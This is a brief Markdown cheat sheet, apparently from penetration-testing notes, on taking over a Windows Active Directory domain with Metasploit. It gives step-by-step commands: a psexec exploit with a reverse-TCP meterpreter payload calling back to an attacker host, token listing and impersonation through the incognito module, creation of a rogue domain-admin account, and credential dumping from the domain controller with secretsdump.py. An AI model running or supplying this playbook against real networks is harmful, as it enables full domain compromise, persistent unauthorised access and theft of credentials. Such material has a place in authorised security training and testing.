# Metasploit

1. Open a meterpreter on the target as an administrative user:
```msfconsole
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
set rhosts <ip>
set smbuser <user>
set smbpass <password>
set smbdomain <AD-domain>
set lhost <attacker-ip>
```
2. Load incognito module in *msfconsole*:
```msfconsole
load incognito
```
3. List user tokens (With the command `help` we can list all available options):
```msfconsole
list_tokens -u
```
4. Impersonate a user from the list:
```msfconsole
impersonate_token <AD-domain>\\<user>
```
5. Undo impersonation  = revert back to the original user:
```msfconsole
rev2self
```

>[!Note] Game over
>If a domain-administrator has logged in to the machine before, his token should be available and we should be able to impersonate him and thus completely own the domain!

As an impersonated domain-admin we can create our own domain-admin user:
```msfconsole
net user /add <user> <password> /domain
```

Add the user to the domain admin group:
```msfconsole
net group "Domain Admins" <user> /ADD /DOMAIN
```

Proof:
In a new command window use *secretsdump.py* on the DC:
```bash
secretsdump.py <AD-domain>/<user>:'<password>'@<dc-ip>
```